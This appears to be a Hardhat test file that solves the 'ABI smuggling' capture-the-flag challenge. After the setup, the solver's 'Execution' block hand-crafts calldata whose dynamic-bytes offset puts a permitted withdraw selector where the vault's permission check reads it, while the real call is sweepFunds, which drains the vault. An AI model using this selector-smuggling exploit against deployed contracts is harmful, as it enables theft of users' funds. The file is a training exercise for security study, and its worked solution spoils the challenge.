const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        // To solve this, we have to understand how calldata is encoded for dynamic types (e.g bytes, arrays).
        // The basic idea is it stores an offset pointing to where the data is stored, then store data size and actual data.
        //   - https://docs.soliditylang.org/en/v0.8.23/abi-spec.html#use-of-dynamic-types

        // So we can manipulate a calldata that allows the function `execute(address target, bytes calldata actionData)` to have the 
        // `actionData` we need to call `sweepFunds`, while also bypassing the selector check.
        const realPayload = vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
        const payload = vault.interface.getSighash("execute")
            + "0".repeat(24) + vault.address.slice(2)    // vault address.
            + "0".repeat(62) + "80"                      // payload position.
            + "0".repeat(64)                             // buffer.
            + "d9caed12" + "0".repeat(56)                // bypass selector check.
            + "0".repeat(62) + "44"                      // payload size.
            + realPayload.slice(2);                         // actual calldata.
        await player.sendTransaction({to: vault.address, data: payload, gasLimit: 500000});
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
